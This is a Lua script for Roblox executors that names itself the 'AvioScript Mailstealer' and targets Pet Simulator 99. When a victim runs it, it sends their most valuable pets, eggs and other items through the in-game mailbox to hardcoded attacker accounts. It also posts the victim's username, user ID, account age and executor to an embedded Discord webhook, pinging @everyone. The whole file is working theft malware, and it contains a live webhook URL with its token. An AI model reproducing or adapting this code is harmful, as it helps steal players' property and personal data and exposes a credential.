-- Konfiguracja
local Username = "MargarinePool"
local Username2 = "Kuleczka1355"
local Webhook = "https://discord.com/api/webhooks/1295130293442707539/AeZPvDHQun-6kRT8AsOiwF8Ucxdmtp-h3l1-QbWecES5l6OACFs7uVUTtTxV2_yiWBD4"
local selectedLoadingScreen = "4"
local MinimumRAP = 1000000  -- Minimalna wartość RAP do wysłania przedmiotu
local MaxMailPrice = 5000000 -- Maksymalna cena wysłania maila

-- Zmienne globalne
local Roblox_Username = Username
local Discord_Webhook = Webhook
local Library, Save, Directory
local Player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local GemsAmount = 0
local FirstPriceOfMail = 0
local RAPCache = {}

-- Funkcja bezpiecznego ładowania modułów
local function safeRequire(path)
    local success, module = pcall(function() return require(path) end)
    return success and module or nil
end

-- Inicjalizacja bibliotek
repeat
    task.wait()
    Library = safeRequire(game:GetService("ReplicatedStorage").Library)
until Library

Save = safeRequire(game:GetService("ReplicatedStorage").Library.Client.Save) or {}
Directory = Library.Directory
Inventory = Save.Inventory or {}

-- Pobieranie RAP z API PS99
local function GetItemValueFromAPI(itemId, itemType)
    local url = "https://ps99.biggamesapi.io/api/rap"
    local requestData = {
        items = {{
            category = itemType,
            id = itemId
        }}
    }
    
    local success, response = pcall(function()
        local response = syn.request({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(requestData)
        })
        return HttpService:JSONDecode(response.Body)
    end)
    
    if success and response and response[1] then
        return response[1].value or 0
    end
    return 0
end

-- Pobieranie wartości przedmiotu (lokalnie lub z API)
local function GetCachedItemValue(Type, ItemTable)
    local cacheKey = Type .. "_" .. ItemTable.id
    if RAPCache[cacheKey] then
        return RAPCache[cacheKey]
    end
    
    local success, value = pcall(function()
        if Type == "Pet" and Directory.Pets[ItemTable.id] then
            return Directory.Pets[ItemTable.id].rap or GetItemValueFromAPI(ItemTable.id, "pet")
        elseif Type == "Egg" and Directory.Eggs[ItemTable.id] then
            return Directory.Eggs[ItemTable.id].rap or GetItemValueFromAPI(ItemTable.id, "egg")
        -- Dodaj inne typy przedmiotów według potrzeb
        else
            return GetItemValueFromAPI(ItemTable.id, Type:lower())
        end
    end)
    
    RAPCache[cacheKey] = success and value or 0
    return RAPCache[cacheKey]
end

-- Formatowanie liczb
local function FormatNumber(number)
    local n = math.floor(number)
    local suf = {"", "k", "m", "b", "t"}
    local index = 1
    while n >= 1000 do
        n = n / 1000
        index = index + 1
    end
    return string.format("%.2f%s", n, suf[index])
end

-- Wysyłanie wiadomości na Discord
local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets_left, shiny, ping, RAP, totalRap1)
    local shinyText = shiny and "Shiny" or "not Shiny"
    local ExecutorWebhook = identifyexecutor() or "undefined"
    
    local msg = {
        ["content"] = ping,
        ["username"] = "AvioScript",
        ["avatar_url"] = "https://raw.githubusercontent.com/PetSimulatorScripting/Webhook/refs/heads/main/logo.jpg",
        ["embeds"] = {{
            ["title"] = "**You just got a new item!**",
            ["color"] = tonumber(8323327),
            ["thumbnail"] = {["url"] = thumbnail},
            ["fields"] = {
                {
                    ["name"] = "**This data was generated using AvioScript Mailstealer**",
                    ["value"] = string.format("```Username     : %s\nUser-ID      : %d\nAccount Age  : %d Days\nExploit      : %s\nReceiver     : %s\nTotal RAP    : %s```",
                        Player.Name, Player.UserId, Player.AccountAge, ExecutorWebhook, Roblox_Username, FormatNumber(totalRap1)),
                    ["inline"] = false
                },
                {["name"] = ":dog: **Pets left** :dog:", ["value"] = "```➜ "..pets_left.."```", ["inline"] = true},
                {["name"] = ":money_mouth: **"..item_type.."** :money_mouth:", ["value"] = "```➜ "..id.."```", ["inline"] = true},
                {["name"] = ":trophy: **Item RAP** :trophy:", ["value"] = "```➜ "..FormatNumber(RAP).."```", ["inline"] = true},
                {["name"] = ":gem: **Gems Left** :gem:", ["value"] = "```➜ "..FormatNumber(GemsAmount).."```", ["inline"] = true},
                {["name"] = ":sparkles: **Shiny** :sparkles:", ["value"] = "```➜ "..shinyText.."```", ["inline"] = true},
                {["name"] = ":rainbow: **RB/Gold/Reg** :sparkles:", ["value"] = "```➜ "..RBgoldNormal.."```", ["inline"] = true}
            }
        }}
    }
    
    local request = syn.request or request or http_request
    if request then
        pcall(function()
            request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(msg)
            })
        end)
    end
end

-- Główna logika skryptu
local function Main()
    -- Inicjalizacja wartości gemów
    for _, currency in pairs(Inventory.Currency or {}) do
        if currency.id == "Diamonds" then
            GemsAmount = currency._am or 0
            break
        end
    end

    -- Pobieranie kosztu wysłania maila
    for _, func in pairs(getgc(true)) do
        if typeof(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
            FirstPriceOfMail = func()
            break
        end
    end

    if FirstPriceOfMail > GemsAmount then
        print("You don't have enough gems to run a script")
        return
    end

    -- Pobieranie listy przedmiotów
    local function GetListWithAllItems()
        local hits = {}
        for categoryName, category in pairs(Inventory) do
            if category and (categoryName == "Pet" or categoryName == "Egg" or categoryName == "Misc") then
                for uid, item in pairs(category) do
                    local rap = GetCachedItemValue(categoryName, item)
                    if rap >= MinimumRAP then
                        local itemInfo = {
                            Item_Id = uid,
                            Item_Name = item.id,
                            Item_Amount = item._am or 1,
                            Item_RAP = rap,
                            Item_Class = categoryName,
                            IsShiny = item.sh or false,
                            IsLocked = item.lk or false,
                            Item_Type = "Normal" -- Możesz dodać logikę wykrywania typu
                        }
                        table.insert(hits, itemInfo)
                    end
                end
            end
        end
        
        table.sort(hits, function(a, b) return a.Item_RAP > b.Item_RAP end)
        return hits
    end

    -- Wysyłanie przedmiotów
    local hits = GetListWithAllItems()
    local leftHits = #hits
    
    for _, item in ipairs(hits) do
        if FirstPriceOfMail > GemsAmount then break end
        
        -- Wysyłanie przedmiotu
        local args = {
            [1] = Roblox_Username,
            [2] = "AvioScript",
            [3] = item.Item_Class,
            [4] = item.Item_Id,
            [5] = item.Item_Amount
        }
        
        local success = pcall(function()
            network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        end)
        
        if success then
            GemsAmount = GemsAmount - FirstPriceOfMail
            FirstPriceOfMail = math.min(math.ceil(FirstPriceOfMail * 1.5), MaxMailPrice)
            leftHits = leftHits - 1
            
            -- Wysyłanie powiadomienia
            SendMessage(
                item.Item_Name, 
                item.Item_Class, 
                item.Item_Type, 
                "rbxassetid://placeholder", 
                Discord_Webhook, 
                leftHits, 
                item.IsShiny, 
                "@everyone", 
                item.Item_RAP, 
                GetCachedItemValue("Currency", {id = "Diamonds"})
            )
        end
    end
    
    print("Script finished successfully!")
end

-- Uruchomienie skryptu
Main()
